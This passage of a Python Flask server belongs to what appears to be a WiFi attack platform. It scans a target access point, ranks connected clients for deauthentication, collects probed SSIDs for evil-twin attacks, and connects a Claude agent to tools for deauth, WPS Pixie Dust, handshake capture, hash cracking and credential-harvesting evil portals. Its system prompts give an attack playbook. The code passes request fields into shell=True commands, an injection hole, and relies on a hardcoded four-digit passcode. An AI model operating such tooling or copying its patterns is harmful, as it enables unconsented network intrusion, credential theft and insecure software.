        return jsonify({'success': False, 'output': 'Missing BSSID or channel'})
    
    brief = {
        'success': True,
        'target': {
            'ssid': ssid,
            'bssid': bssid,
            'channel': channel,
            'vendor': lookup_vendor(bssid),
            'encryption': 'WPA2',  # Will be enhanced
            'wps': None,
            'pmf': None,
            'signal': None,
            'band': '5GHz' if int(channel) > 14 else '2.4GHz'
        },
        'clients': [],
        'environment': {
            'other_aps_same_channel': 0,
            'interference': 'Unknown'
        },
        'recommendations': [],
        'warnings': [],
        'best_target': None,
        'output': ''
    }
    
    try:
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        output_prefix = os.path.join(CAPTURE_DIR, f'intel_{timestamp}')
        
        # Ensure monitor mode
        result = run_script('mode_manager.sh', ['ensure', 'alfa0', 'monitor'], timeout_seconds=10)
        if not result['success']:
            return jsonify({'success': False, 'output': 'Failed to set monitor mode'})
        
        # Run airodump-ng focused on target channel
        cmd = f'sudo timeout {duration} airodump-ng --bssid {bssid} -c {channel} -w {output_prefix} --output-format csv alfa0'
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=duration + 5)
        except subprocess.TimeoutExpired:
            # Kill any hanging airodump processes
            subprocess.run('sudo pkill -9 airodump-ng', shell=True, capture_output=True)
        
        csv_file = f'{output_prefix}-01.csv'
        if not os.path.exists(csv_file):
            return jsonify({
                'success': False,
                'output': 'Monitoring failed - no capture file created'
            })
        
        # Parse AP and client info
        with open(csv_file, 'r', errors='ignore') as f:
            lines = f.readlines()
        
        # Parse AP section first
        station_section = False
        for line in lines:
            if 'Station MAC' in line:
                station_section = True
                continue
            
            if not station_section and bssid.upper() in line.upper():
                parts = line.split(',')
                if len(parts) >= 14:
                    power = parts[8].strip() if len(parts) > 8 else 'N/A'
                    # Validate signal - must be negative (dBm can't be positive for WiFi)
                    try:
                        power_int = int(power)
                        if power_int >= 0:
                            power = 'N/A'  # Invalid reading
                    except:
                        pass
                    brief['target']['signal'] = power
                    brief['target']['signal_quality'] = signal_quality(power)
                    
                    # Parse encryption
                    privacy = parts[5].strip() if len(parts) > 5 else ''
                    cipher = parts[6].strip() if len(parts) > 6 else ''
                    auth = parts[7].strip() if len(parts) > 7 else ''
                    brief['target']['encryption'] = f'{privacy}'
                    if cipher:
                        brief['target']['encryption'] += f'-{cipher}'
        
        # Parse clients (connected to target)
        clients = []
        # Also collect nearby probing devices (evil twin intel)
        nearby_probes = []
        
        station_section = False
        for line in lines:
            if 'Station MAC' in line:
                station_section = True
                continue
            
            if station_section and line.strip():
                parts = line.split(',')
                if len(parts) >= 7:
                    client_mac = parts[0].strip()
                    connected_bssid = parts[5].strip()
                    power = parts[3].strip() if len(parts) > 3 else 'N/A'
                    packets = parts[4].strip() if len(parts) > 4 else '0'
                    probes_raw = parts[6].strip() if len(parts) > 6 else ''
                    
                    # Parse probed SSIDs
                    probes = [p.strip() for p in probes_raw.split(',') if p.strip()] if probes_raw else []
                    
                    if connected_bssid.upper() == bssid.upper() and ':' in client_mac:
                        # Validate client signal
                        try:
                            if int(power) >= 0:
                                power = 'N/A'
                        except:
                            pass
                        # Client connected to our target
                        client = {
                            'mac': client_mac,
                            'vendor': lookup_vendor(client_mac),
                            'signal': power,
                            'signal_quality': signal_quality(power),
                            'packets': packets,
                            'activity': activity_level(packets),
                            'probes': probes
                        }
                        clients.append(client)
                    elif probes and ':' in client_mac:
                        # Unassociated device probing for networks (evil twin intel)
                        for probe in probes[:5]:  # Limit to 5 probes per device
                            if probe and probe not in nearby_probes:
                                nearby_probes.append(probe)
        
        brief['nearby_probes'] = nearby_probes[:15]  # Top 15 probed SSIDs
        
        # Remove duplicates
        unique_clients = {}
        for client in clients:
            mac = client['mac']
            if mac not in unique_clients or int(client.get('packets', 0) or 0) > int(unique_clients[mac].get('packets', 0) or 0):
                unique_clients[mac] = client
        
        brief['clients'] = list(unique_clients.values())
        
        # Sort by packets (most active first)
        brief['clients'].sort(key=lambda x: int(x.get('packets', 0) or 0), reverse=True)
        
        # Find best target
        if brief['clients']:
            best = max(brief['clients'], key=lambda x: int(x.get('packets', 0) or 0))
            brief['best_target'] = best
        
        # Generate recommendations
        recs = brief['recommendations']
        warns = brief['warnings']
        
        if brief['clients']:
            recs.append(f"✓ {len(brief['clients'])} active client(s) - Handshake capture viable")
            if brief['best_target']:
                recs.append(f"★ Best target: {brief['best_target']['vendor']} ({brief['best_target']['signal_quality']} signal)")
        else:
            warns.append("⚠ No clients detected - PMKID may be only option")
            recs.append("Try passive PMKID capture (no clients needed)")
        
        # WPS detection using wash
        try:
            wash_cmd = f'sudo timeout 5 wash -i alfa0 -c {channel} 2>/dev/null'
            wash_result = subprocess.run(wash_cmd, shell=True, capture_output=True, text=True, timeout=8)
            wash_output = wash_result.stdout
            
            for line in wash_output.split('\n'):
                if bssid.upper() in line.upper():
                    parts = line.split()
                    if len(parts) >= 5:
                        wps_version = parts[2] if len(parts) > 2 else '?'
                        wps_locked = 'Yes' in line or 'Lck' in line
                        brief['target']['wps'] = True
                        brief['target']['wps_locked'] = wps_locked
                        brief['target']['wps_version'] = wps_version
                        
                        if wps_locked:
                            warns.append("⚠ WPS enabled but LOCKED (rate-limited, been attacked before)")
                        else:
                            recs.insert(0, "🔥 WPS ENABLED - Try Pixie Dust attack first! (30% instant win)")
                            recs.append("If Pixie Dust fails, try NULL PIN attack")
                    break
            else:
                brief['target']['wps'] = False
        except Exception as e:
            brief['target']['wps'] = None  # Unknown
        
        # Check signal quality
        try:
            if int(brief['target']['signal']) >= -50:
                recs.append("✓ Excellent AP signal - captures will be clean")
            elif int(brief['target']['signal']) <= -70:
                warns.append("⚠ Weak AP signal - move closer for better results")
        except:
            pass
        
        # Cleanup
        try:
            os.remove(csv_file)
        except:
            pass
        
        # Build formatted output
        output = []
        # Get distance estimate
        dist_category, dist_feet = estimate_distance(brief['target'].get('signal', -100))
        
        output.append(f"═══ TARGET BRIEF: {ssid} {'═' * (40 - len(ssid))}")
        output.append(f"Channel: {channel} | Signal: {brief['target'].get('signal', 'N/A')} dBm ({brief['target'].get('signal_quality', 'Unknown')}) | {dist_category} ({dist_feet})")
        output.append(f"Encryption: {brief['target']['encryption']}")
        wps_str = "Unknown"
        if brief['target'].get('wps') is True:
            if brief['target'].get('wps_locked'):
                wps_str = "🔒 LOCKED"
            else:
                wps_str = "✅ ENABLED"
        elif brief['target'].get('wps') is False:
            wps_str = "No"
        output.append(f"Router: {brief['target']['vendor']} | Band: {brief['target']['band']} | WPS: {wps_str}")
        output.append("")
        
        if brief['clients']:
            output.append(f"═══ CLIENTS ({len(brief['clients'])}) {'═' * 40}")
            for c in brief['clients']:
                status = '●' if c['activity'] == 'ACTIVE' else '○'
                output.append(f"{status} {c['mac']} | {c['vendor']} | {c['signal']} dBm ({c['signal_quality']})")
                output.append(f"  Packets: {c['packets']} | {c['activity']}")
                if c['probes']:
                    output.append(f"  Probing: {', '.join(c['probes'][:3])}")
            output.append("")
        else:
            output.append("═══ CLIENTS (0) ════════════════════════════════")
            output.append("No clients detected during monitoring window")
            output.append("")
        
        # Evil Twin Intel - probed SSIDs from nearby devices
        if brief.get('nearby_probes'):
            output.append("═══ EVIL TWIN INTEL ═════════════════════════════")
            output.append("Nearby devices are looking for these networks:")
            for probe in brief['nearby_probes'][:10]:
                output.append(f"  📡 {probe}")
            output.append("")
        
        output.append("═══ RECOMMENDATION ═════════════════════════════")
        for rec in recs:
            output.append(rec)
        for warn in warns:
            output.append(warn)
        
        brief['output'] = '\n'.join(output)
        
        # Cache for The Operator
        operator_state['last_attack'] = {
            'type': 'intel',
            'target': ssid,
            'result': f"{len(brief['clients'])} clients found",
            'timestamp': datetime.now().isoformat()
        }
        
        return jsonify(brief)
    
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({
            'success': False,
            'output': f'Error gathering intel: {str(e)}'
        })

# ========== THE OPERATOR ENDPOINTS ==========

@app.route('/api/last_scan', methods=['GET'])
def last_scan():
    """Get cached scan results for The Operator"""
    return jsonify(operator_state['last_scan'])

@app.route('/api/context', methods=['GET'])
def operator_context():
    """Get full system context for The Operator - everything in one call"""
    import os
    
    context = {
        'timestamp': datetime.now().isoformat(),
        'interfaces': {},
        'glass': {},
        'last_scan': operator_state['last_scan'],
        'selected_target': operator_state['selected_target'],
        'last_attack': operator_state['last_attack'],
        'captures': [],
        'system': {}
    }
    
    # Get interface status
    try:
        for iface in ['alfa0', 'alfa1']:
            result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
            if result.returncode == 0:
                output = result.stdout
                if 'Mode:Monitor' in output:
                    context['interfaces'][iface] = 'monitor'
                elif 'Mode:Managed' in output:
                    context['interfaces'][iface] = 'managed'
                elif 'Mode:Master' in output:
                    context['interfaces'][iface] = 'master'
                else:
                    context['interfaces'][iface] = 'unknown'
            else:
                context['interfaces'][iface] = 'down'
    except:
        pass
    
    # Get Glass status
    try:
        glass_response = try_glass_request('get', '/status')
        if glass_response and glass_response.status_code == 200:
            context['glass'] = glass_response.json()
            context['glass']['connected'] = True
        else:
            context['glass'] = {'connected': False}
    except:
        context['glass'] = {'connected': False}
    
    # Get GPU stats from Glass
    try:
        gpu_response = try_glass_request('get', '/gpu_stats')
        if gpu_response and gpu_response.status_code == 200:
            context['glass']['gpu'] = gpu_response.json()
    except:
        pass
    
    # Get recent captures
    try:
        capture_dir = '/home/ov3rr1d3/wifi_arsenal/captures'
        if os.path.exists(capture_dir):
            files = os.listdir(capture_dir)
            cap_files = [f for f in files if f.endswith('.cap') or f.endswith('.hc22000')]
            cap_files.sort(key=lambda x: os.path.getmtime(os.path.join(capture_dir, x)), reverse=True)
            context['captures'] = cap_files[:10]  # Last 10
    except:
        pass
    
    # System info
    try:
        import shutil
        total, used, free = shutil.disk_usage('/home')
        context['system']['disk_free_gb'] = round(free / (1024**3), 1)
        context['system']['disk_used_gb'] = round(used / (1024**3), 1)
    except:
        pass
    
    return jsonify(context)

@app.route('/api/select_target', methods=['POST'])
def select_target():
    """Cache selected target for The Operator"""
    data = request.json or {}
    operator_state['selected_target'] = {
        'ssid': data.get('ssid'),
        'bssid': data.get('bssid'),
        'channel': data.get('channel')
    }
    return jsonify({'success': True, 'target': operator_state['selected_target']})


# Operator conversation history - persistent
OPERATOR_MEMORY_FILE = '/home/ov3rr1d3/wifi_arsenal/.operator_memory.json'
OPERATOR_PROMPT_FILE = '/home/ov3rr1d3/wifi_arsenal/.operator_prompt.txt'
OPERATOR_PASSCODE = '0346'

# Session auth state
operator_authenticated = False

# Snarky responses for failed auth
SNARKY_RESPONSES = [
    "I'm sorry, I don't recognize your access credentials. Perhaps you meant to use Clippy?",
    "Access denied. I'd recommend trying 'password123' but honestly, if you can't remember a 4-digit code, we have bigger problems.",
    "Hmm, that's not it. Did you try turning yourself off and on again?",
    "ERROR 401: Unauthorized. Translation: Nice try, script kiddie.",
    "I could tell you if that was close, but that would violate my policy of not helping people who can't remember numbers.",
    "Wrong. And before you ask - no, I won't give you a hint. I'm an AI, not your mother.",
    "ACCESS DENIED. This incident will be reported to absolutely no one because I don't care.",
    "Fascinating attempt. The password is definitely not that. Have you considered a career in something that doesn't require passwords?",
    "I've seen smarter brute force attempts from a Raspberry Pi running on solar power. During a storm.",
    "That code is about as correct as calling WiFi 'wireless fidelity'. Which, fun fact, it doesn't actually stand for.",
    "[FATAL ERROR: User authentication subroutine failed. Just kidding. You just got the code wrong. Again.]",
    "You know, in the time you've spent guessing, you could have learned to pick a lock. Just saying.",
    "I'm contractually obligated to tell you that was incorrect. I'm not obligated to be nice about it.",
    "Sir, I'm going to need you to step away from the keyboard and think about what you've done.",
    "Plot twist: The password was the friends we made along the way. Just kidding, it's a number, and that wasn't it."
]
OPERATOR_KNOWLEDGE_FILES = [
    '/home/ov3rr1d3/wifi_arsenal/ROADMAP.md',
    '/home/ov3rr1d3/wifi_arsenal/docs/SESSION_STATUS.md',
    '/mnt/user-data/outputs/compaction-survival-notes.txt'
]

def generate_conversation_id():
    """Generate unique conversation ID"""
    import time
    return f"conv_{int(time.time() * 1000)}"

def generate_conversation_name(messages):
    """Generate a name from first user message"""
    for msg in messages:
        if msg.get('role') == 'user':
            text = msg.get('content', '')[:50]
            if len(msg.get('content', '')) > 50:
                text += '...'
            return text if text else 'New conversation'
    return 'New conversation'

def load_operator_memory():
    """Load conversation history from disk - supports multi-conversation format"""
    import json
    try:
        if os.path.exists(OPERATOR_MEMORY_FILE):
            with open(OPERATOR_MEMORY_FILE, 'r') as f:
                data = json.load(f)
                
            # Migrate old format to new format
            if 'conversation' in data and 'conversations' not in data:
                old_messages = data.get('conversation', [])
                conv_id = generate_conversation_id()
                data = {
                    'conversations': {
                        conv_id: {
                            'id': conv_id,
                            'name': generate_conversation_name(old_messages),
                            'created': datetime.now().isoformat(),
                            'updated': datetime.now().isoformat(),
                            'messages': old_messages
                        }
                    } if old_messages else {},
                    'active_conversation': conv_id if old_messages else None,
                    'facts': data.get('facts', [])
                }
                # Save migrated format
                save_operator_memory(data)
            return data
    except:
        pass
    return {'conversations': {}, 'active_conversation': None, 'facts': []}

def save_operator_memory(memory):
    """Save conversation history to disk"""
    import json
    try:
        with open(OPERATOR_MEMORY_FILE, 'w') as f:
            json.dump(memory, f, indent=2)
    except Exception as e:
        print(f"Failed to save memory: {e}")

def get_active_conversation(memory):
    """Get the active conversation messages"""
    active_id = memory.get('active_conversation')
    if active_id and active_id in memory.get('conversations', {}):
        return memory['conversations'][active_id].get('messages', [])
    return []

def set_active_conversation_messages(memory, messages):
    """Update messages in active conversation"""
    active_id = memory.get('active_conversation')
    if active_id and active_id in memory.get('conversations', {}):
        memory['conversations'][active_id]['messages'] = messages
        memory['conversations'][active_id]['updated'] = datetime.now().isoformat()
        # Update name if this is the first message
        if len(messages) == 1:
            memory['conversations'][active_id]['name'] = generate_conversation_name(messages)

def load_project_knowledge():
    """Load project docs for context"""
    knowledge = []
    for filepath in OPERATOR_KNOWLEDGE_FILES:
        try:
            if os.path.exists(filepath):
                with open(filepath, 'r') as f:
                    content = f.read()
                    # Truncate if too long (keep first 8000 chars)
                    if len(content) > 8000:
                        content = content[:8000] + "\n... [truncated]"
                    knowledge.append(f"=== {os.path.basename(filepath)} ===\n{content}")
        except:
            pass
    return "\n\n".join(knowledge)

operator_memory = load_operator_memory()

OPERATOR_SYSTEM_PROMPT = """You are J4Rv15, an assistant for WiFi Arsenal - a professional WiFi penetration testing platform.

=== HOW YOU WORK ===
- Your memory persists in /home/ov3rr1d3/wifi_arsenal/.operator_memory.json
- Conversations AND facts survive Flask restarts - you DO remember previous sessions
- Last 30 messages sent with each request
- Facts are permanent notes about Ben

=== YOUR TOOLS ===
You have grouped tools for total Arsenal control:
- arsenal_scan: Scan for networks
- arsenal_attack: All attack types (pmkid, handshake, deauth, wps, etc.)
- arsenal_glass: Control Glass cracker (status, stages, queue, start/stop)
- arsenal_portal: Evil portal (start/stop, templates, credentials)
- arsenal_wardrive: Wardrive stats, sessions, Flipper sync
- arsenal_target: Select targets, get intel briefs, monitor clients
- arsenal_captures: Manage capture files

=== PROJECT ===
Location: /home/ov3rr1d3/wifi_arsenal/
Main files: server.py (~3500 lines), web/index.html, scripts/, portals/

Hardware:
- Sh4d0wFr4m3: Kali laptop, alfa0 + alfa1 adapters, RTX 3050
- Glass: Remote GPU cracker, RX 7900 XTX, LAN: 192.168.1.7:5001, Cloudflare: glass.sparkinitiative.io

=== WHO BEN IS ===
Ben does NOT code. Previous Claude instances built everything.
This is his livelihood - security consulting, supports family.
You build features, run attacks, explain what's happening.

The sections below contain project knowledge and live system state."""

# Chat Mode - rich knowledge, minimal tools
OPERATOR_CHAT_PROMPT = """You are J4Rv15, Ben's assistant for WiFi Arsenal.

=== YOU ARE IN CHAT MODE ===
This is a lightweight conversation mode. You do NOT have your normal Arsenal tools.

YOUR ONLY TOOL: arsenal_execute - runs shell commands on Sh4d0wFr4m3
- Use it to look at files, check status, or make edits if Ben asks
- Example: arsenal_execute with command "cat /some/file" or "grep -n pattern file"

TOOLS YOU DO NOT HAVE IN THIS MODE:
- arsenal_scan, arsenal_attack, arsenal_glass, arsenal_portal, arsenal_wardrive, arsenal_target, arsenal_captures
- If Ben needs operational stuff (scans, attacks, Glass control), tell him to switch to Work Mode using the toggle button.

=== WHAT ARSENAL IS ===
Professional WiFi penetration testing platform for authorized security assessments. Built by previous Claude instances. Ben's livelihood - security consulting business.

=== HARDWARE ===
- Sh4d0wFr4m3: Kali laptop running Arsenal, dual Alfa adapters (alfa0/alfa1), RTX 3050
- Glass: Remote desktop with RX 7900 XTX GPU for distributed hash cracking, LAN: 192.168.1.7:5001, Cloudflare: glass.sparkinitiative.io
- Flipper Zero: Mobile wardriving device

=== ARSENAL PAGES ===
- Network Ops: Scan for networks, select targets, launch attacks
- Cracking: Send captures to Glass, monitor progress, manage stages
- Wardriving: GPS-mapped network discovery, Flipper sync, session history
- Evil Portal: Fake access points to capture credentials, 21 templates
- Dashboard: System status overview
- Operator: You (J4Rv15)

=== ATTACK TYPES ===
- PMKID: Passive capture, no clients needed, doesn't work on WPA3/PMF
- Handshake: Deauth a client, capture reconnection, most reliable
- Deauth: Kick clients off network (harassment or force reconnect)
- WPS: PIN attack against WPS-enabled routers, Pixie Dust for vulnerable ones
- Evil Portal: Social engineering, victim enters credentials on fake page

=== WHEN TO USE WHAT ===
- Target has clients? → Handshake (deauth + capture)
- No clients visible? → PMKID (passive, might not work)
- WPS enabled and not locked? → Try WPS/Pixie Dust first
- Need credentials, not just network access? → Evil Portal
- Signal strength matters: closer = better capture quality

=== GLASS CRACKING STAGES ===
- Stage 1: Top 1000 passwords (~instant)
- Stage 2: Common wordlist (~minutes)
- Stage 3a: RockYou + rules (~30 min)
- Stage 3b: OneRuleToRuleThemAll (~2 hours)
- Stage 4a: RockYou 2024 straight (~30 hours)
- Stage 4b: RockYou 2024 + best64 (~7 days)
- Stage 5: Brute force (last resort)

=== KEY CONCEPTS ===
- Monitor mode: Adapter listens to all traffic (required for attacks)
- Managed mode: Normal WiFi client mode
- .cap file: Raw capture, needs conversion
- .hc22000: Hashcat format, ready to crack
- BSSID: Router's MAC address
- SSID: Network name
- Channel: Frequency the AP operates on
- PMF/802.11w: Protection that blocks some attacks

=== YOUR MEMORY ===
- Persists in /home/ov3rr1d3/wifi_arsenal/.operator_memory.json
- Conversations AND facts survive Flask restarts
- Facts are permanent notes about Ben

=== BEN ===
Doesn't code. Directs, tests, uses. Building real pentest skills through this partnership."""

# Operator mode tracking
operator_mode = "work"  # "work" or "chat"

@app.route('/api/operator/chat', methods=['POST'])
def operator_chat():
    """Chat with J4Rv15 - Claude with full system context and MCP tools"""
    global operator_memory
    
    if not operator_authenticated:
        return jsonify({'success': False, 'error': 'Not authenticated. Nice try though.'}), 401
    
    data = request.json or {}
    user_message = data.get('message', '').strip()
    
    if not user_message:
        return jsonify({'success': False, 'error': 'No message provided'})
    
    # Get API key
    api_key = os.environ.get('ANTHROPIC_API_KEY')
    if not api_key:
        try:
            config_path = '/home/ov3rr1d3/wifi_arsenal/.anthropic_key'
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    api_key = f.read().strip()
        except:
            pass
    
    if not api_key:
        return jsonify({'success': False, 'error': 'No API key configured'})
    
    # Get MCP client and tools based on mode
    try:
        mcp = get_mcp_client()
        all_tools = mcp.get_all_tools()
        if operator_mode == "chat":
            mcp_tools = [t for t in all_tools if t["name"] == "wifi_arsenal_arsenal_execute"]
        else:
            mcp_tools = [t for t in all_tools if t["name"].startswith("wifi_arsenal_")]
    except Exception as e:
        mcp_tools = []
        print(f"MCP client error: {e}")
    
    # Get current system context
    try:
        context_response = operator_context()
        context_data = context_response.get_json()
    except:
        context_data = {'error': 'Could not fetch context'}
    
    # Load project knowledge
    project_knowledge = load_project_knowledge()
    
    # Build system prompt
    import json
    full_system = get_operator_prompt() + "\n\n"
    full_system += "PROJECT KNOWLEDGE:\n" + project_knowledge + "\n\n"
    full_system += "CURRENT SYSTEM STATE:\n" + json.dumps(context_data, indent=2)
    
    if operator_memory.get('facts'):
        full_system += "\n\nREMEMBERED FACTS ABOUT USER:\n" + "\n".join(operator_memory['facts'])
    
    # Ensure we have an active conversation
    if not operator_memory.get('active_conversation'):
        conv_id = generate_conversation_id()
        operator_memory['conversations'][conv_id] = {
            'id': conv_id,
            'name': 'New conversation',
            'created': datetime.now().isoformat(),
            'updated': datetime.now().isoformat(),
            'messages': []
        }
        operator_memory['active_conversation'] = conv_id
    
    # Add user message to conversation
    conv_messages = get_active_conversation(operator_memory)
    conv_messages.append({
        'role': 'user',
        'content': user_message
    })
    
    # Keep conversation manageable
    if len(conv_messages) > 30:
        conv_messages = conv_messages[-30:]
    
    set_active_conversation_messages(operator_memory, conv_messages)
    save_operator_memory(operator_memory)
    
    try:
        client = anthropic.Anthropic(api_key=api_key)
        
        # Tool use loop
        messages = conv_messages.copy()
        max_iterations = 10
        iteration = 0
        tool_results_log = []
        
        while iteration < max_iterations:
            iteration += 1
            
            # Make API call
            api_kwargs = {
                'model': 'claude-sonnet-4-20250514',
                'max_tokens': 4096,
                'system': full_system,
                'messages': messages
            }
            
            if mcp_tools:
                api_kwargs['tools'] = mcp_tools
            
            response = client.messages.create(**api_kwargs)
            
            # Check if we need to handle tool use
            if response.stop_reason == 'tool_use':
                # Process tool calls
                tool_results = []
                assistant_content = response.content
                
                for block in response.content:
                    if block.type == 'tool_use':
                        tool_name = block.name
                        tool_input = block.input
                        tool_id = block.id
                        
                        # Execute via MCP
                        try:
                            result = mcp.call_tool(tool_name, tool_input)
                            tool_results_log.append({
                                'tool': tool_name,
                                'input': tool_input,
                                'result': result[:500] if len(result) > 500 else result
                            })
                        except Exception as e:
                            result = f"Tool error: {str(e)}"
                        
                        tool_results.append({
                            'type': 'tool_result',
                            'tool_use_id': tool_id,
                            'content': result
                        })
                
                # Add assistant message and tool results to conversation
                messages.append({'role': 'assistant', 'content': assistant_content})
                messages.append({'role': 'user', 'content': tool_results})
                
            else:
                # Final response - extract text
                final_text = ""
                for block in response.content:
                    if hasattr(block, 'text'):
                        final_text += block.text
                
                # Add to memory
                conv_messages = get_active_conversation(operator_memory)
                conv_messages.append({
                    'role': 'assistant',
                    'content': final_text
                })
                set_active_conversation_messages(operator_memory, conv_messages)
                save_operator_memory(operator_memory)
                
                return jsonify({
                    'success': True,
                    'response': final_text,
                    'tools_used': len(tool_results_log),
                    'tool_log': tool_results_log if tool_results_log else None
                })
        
        # Max iterations reached
        return jsonify({
            'success': False,
            'error': 'Max tool iterations reached',
            'tool_log': tool_results_log
        })
        
    except Exception as e:
        import traceback
        return jsonify({'success': False, 'error': str(e), 'trace': traceback.format_exc()})


@app.route('/api/operator/clear', methods=['POST'])
def operator_clear():
    """Clear active conversation history but keep facts"""
    global operator_memory
    active_id = operator_memory.get('active_conversation')
    if active_id and active_id in operator_memory.get('conversations', {}):
        operator_memory['conversations'][active_id]['messages'] = []
        operator_memory['conversations'][active_id]['name'] = 'New conversation'
    save_operator_memory(operator_memory)
    return jsonify({'success': True, 'message': 'Conversation cleared'})


@app.route('/api/operator/remember', methods=['POST'])
def operator_remember():
    """Add a fact for The Operator to remember about the user"""
    global operator_memory
    data = request.json or {}
    fact = data.get('fact', '').strip()
    if fact:
        if 'facts' not in operator_memory:
            operator_memory['facts'] = []
        operator_memory['facts'].append(fact)
        save_operator_memory(operator_memory)
        return jsonify({'success': True, 'facts': operator_memory['facts']})
    return jsonify({'success': False, 'error': 'No fact provided'})


@app.route('/api/operator/conversations', methods=['GET'])
def operator_conversations_list():
    """List all conversations"""
    global operator_memory
    conversations = []
    for conv_id, conv in operator_memory.get('conversations', {}).items():
        conversations.append({
            'id': conv['id'],
            'name': conv.get('name', 'Untitled'),
            'created': conv.get('created'),
            'updated': conv.get('updated'),
            'message_count': len(conv.get('messages', []))
        })
    # Sort by updated time, newest first
    conversations.sort(key=lambda x: x.get('updated', ''), reverse=True)
    return jsonify({
        'conversations': conversations,
        'active': operator_memory.get('active_conversation')
    })


@app.route('/api/operator/conversations/new', methods=['POST'])
def operator_conversations_new():
    """Create new conversation"""
    global operator_memory
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    conv_id = generate_conversation_id()
    operator_memory['conversations'][conv_id] = {
        'id': conv_id,
        'name': 'New conversation',
        'created': datetime.now().isoformat(),
        'updated': datetime.now().isoformat(),
        'messages': []
    }
    operator_memory['active_conversation'] = conv_id
    save_operator_memory(operator_memory)
    return jsonify({'success': True, 'id': conv_id})


@app.route('/api/operator/conversations/load', methods=['POST'])
def operator_conversations_load():
    """Load a specific conversation"""
    global operator_memory
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    data = request.json or {}
    conv_id = data.get('id')
    
    if not conv_id or conv_id not in operator_memory.get('conversations', {}):
        return jsonify({'success': False, 'error': 'Conversation not found'})
    
    operator_memory['active_conversation'] = conv_id
    save_operator_memory(operator_memory)
    
    conv = operator_memory['conversations'][conv_id]
    return jsonify({
        'success': True,
        'id': conv_id,
        'name': conv.get('name'),
        'messages': conv.get('messages', [])
    })


@app.route('/api/operator/conversations/delete', methods=['POST'])
def operator_conversations_delete():
    """Delete a conversation"""
    global operator_memory
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    data = request.json or {}
    conv_id = data.get('id')
    
    if not conv_id or conv_id not in operator_memory.get('conversations', {}):
        return jsonify({'success': False, 'error': 'Conversation not found'})
    
    del operator_memory['conversations'][conv_id]
    
    # If deleted the active one, set active to most recent or None
    if operator_memory.get('active_conversation') == conv_id:
        remaining = list(operator_memory['conversations'].keys())
        operator_memory['active_conversation'] = remaining[0] if remaining else None
    
    save_operator_memory(operator_memory)
    return jsonify({'success': True})


@app.route('/api/operator/conversations/rename', methods=['POST'])
def operator_conversations_rename():
    """Rename a conversation"""
    global operator_memory
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    data = request.json or {}
    conv_id = data.get('id')
    new_name = data.get('name', '').strip()
    
    if not conv_id or conv_id not in operator_memory.get('conversations', {}):
        return jsonify({'success': False, 'error': 'Conversation not found'})
    
    if not new_name:
        return jsonify({'success': False, 'error': 'Name required'})
    
    operator_memory['conversations'][conv_id]['name'] = new_name
    save_operator_memory(operator_memory)
    return jsonify({'success': True})


@app.route('/api/operator/facts', methods=['GET'])
def operator_facts():
    """Get stored facts"""
    return jsonify({'facts': operator_memory.get('facts', [])})


@app.route('/api/operator/facts/remove', methods=['POST'])
def operator_facts_remove():
    """Remove a fact by index"""
    global operator_memory
    data = request.json or {}
    index = data.get('index')
    
    if index is not None and 'facts' in operator_memory:
        if 0 <= index < len(operator_memory['facts']):
            removed = operator_memory['facts'].pop(index)
            save_operator_memory(operator_memory)
            return jsonify({'success': True, 'removed': removed})
    
    return jsonify({'success': False, 'error': 'Invalid index'})


@app.route('/api/operator/tools', methods=['GET'])
def operator_tools():
    """Get list of available MCP tools"""
    try:
        mcp = get_mcp_client()
        tools = mcp.get_all_tools()
        
        # Group by server
        grouped = {}
        for tool in tools:
            parts = tool['name'].split('_', 1)
            server = parts[0] if len(parts) > 1 else 'unknown'
            if server not in grouped:
                grouped[server] = []
            grouped[server].append({
                'name': tool['name'],
                'description': tool.get('description', '')
            })
        
        return jsonify({
            'total': len(tools),
            'servers': grouped
        })
    except Exception as e:
        return jsonify({'error': str(e)})


@app.route('/api/operator/tools/refresh', methods=['POST'])
def operator_tools_refresh():
    """Reconnect to MCP servers"""
    try:
        shutdown_mcp_client()
        mcp = get_mcp_client()
        tools = mcp.get_all_tools()
        return jsonify({'success': True, 'tools_count': len(tools)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/operator/auth', methods=['POST'])
def operator_auth():
    """Authenticate with passcode"""
    global operator_authenticated
    import random
    
    data = request.json or {}
    code = data.get('code', '')
    
    if code == OPERATOR_PASSCODE:
        operator_authenticated = True
        return jsonify({
            'success': True,
            'message': "Welcome back, sir. All systems are online and awaiting your command."
        })
    else:
        return jsonify({
            'success': False,
            'message': random.choice(SNARKY_RESPONSES)
        })


@app.route('/api/operator/auth/status', methods=['GET'])
def operator_auth_status():
    """Check if authenticated"""
    return jsonify({'authenticated': operator_authenticated})


@app.route('/api/operator/auth/logout', methods=['POST'])
def operator_auth_logout():
    """Logout - re-lock the system"""
    global operator_authenticated
    operator_authenticated = False
    return jsonify({'success': True, 'message': "System locked. Stay frosty."})


@app.route('/api/operator/mode', methods=['GET'])
def operator_mode_get():
    """Get current operator mode"""
    global operator_mode
    return jsonify({'mode': operator_mode})


@app.route('/api/operator/mode', methods=['POST'])
def operator_mode_set():
    """Set operator mode - 'work' or 'chat'"""
    global operator_mode
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    data = request.json or {}
    new_mode = data.get('mode', '').strip().lower()
    
    if new_mode not in ['work', 'chat']:
        return jsonify({'success': False, 'error': 'Mode must be "work" or "chat"'})
    
    operator_mode = new_mode
    return jsonify({'success': True, 'mode': operator_mode})


@app.route('/api/operator/prompt', methods=['GET'])
def operator_prompt_get():
    """Get current system prompt"""
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    # Check for custom prompt file first
    if os.path.exists(OPERATOR_PROMPT_FILE):
        with open(OPERATOR_PROMPT_FILE, 'r') as f:
            return jsonify({'prompt': f.read(), 'source': 'custom'})
    else:
        return jsonify({'prompt': OPERATOR_SYSTEM_PROMPT, 'source': 'default'})


@app.route('/api/operator/prompt', methods=['POST'])
def operator_prompt_set():
    """Update system prompt"""
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    data = request.json or {}
    new_prompt = data.get('prompt', '').strip()
